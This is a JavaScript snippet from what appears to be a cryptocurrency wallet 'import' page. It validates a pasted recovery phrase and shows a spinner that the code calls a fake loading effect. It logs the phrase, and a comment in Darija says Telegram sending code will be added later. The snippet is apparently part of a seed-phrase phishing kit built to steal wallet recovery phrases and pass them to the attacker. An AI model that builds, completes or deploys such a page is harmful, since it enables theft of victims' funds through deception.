    <script>
        const form = document.getElementById('importForm');
        const phraseInput = document.getElementById('phrase-input');
        const errorBox = document.getElementById('error-box');
        const btnText = document.getElementById('btnText');

        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const rawValue = phraseInput.value.trim();
            const words = rawValue.split(/\s+/);
            const validCounts = [12, 15, 18, 21, 24];

            // Reset UI
            errorBox.style.display = 'none';
            phraseInput.style.borderColor = 'rgba(255, 255, 255, 0.08)';

            // 1. Check word count
            if (!validCounts.includes(words.length)) {
                showError(`Invalid phrase length. Expected 12, 18 or 24 words. (Current: ${words.length})`);
                return;
            }

            // 2. Check for duplicates (Words typed twice)
            const duplicates = words.filter((item, index) => words.indexOf(item) !== index);
            if (duplicates.length > 0) {
                showError(`Duplicate word detected: "${duplicates[0]}". Please check your phrase.`);
                return;
            }

            // 3. Fake Loading (Pro Effect)
            btnText.innerText = "Verifying...";
            document.getElementById('submitBtn').style.opacity = "0.7";
            document.getElementById('submitBtn').style.pointerEvents = "none";

            // Success - Log to console
            console.log("Phrase Validated:", rawValue);
            
            // HNA TQDER TZID L-CODE DIAL TELEGRAM LATER
        });

        function showError(msg) {
            errorBox.innerText = msg;
            errorBox.style.display = 'block';
            errorBox.classList.add('shake');
            phraseInput.style.borderColor = 'var(--error-red)';
            
            setTimeout(() => errorBox.classList.remove('shake'), 500);
        }
    </script>
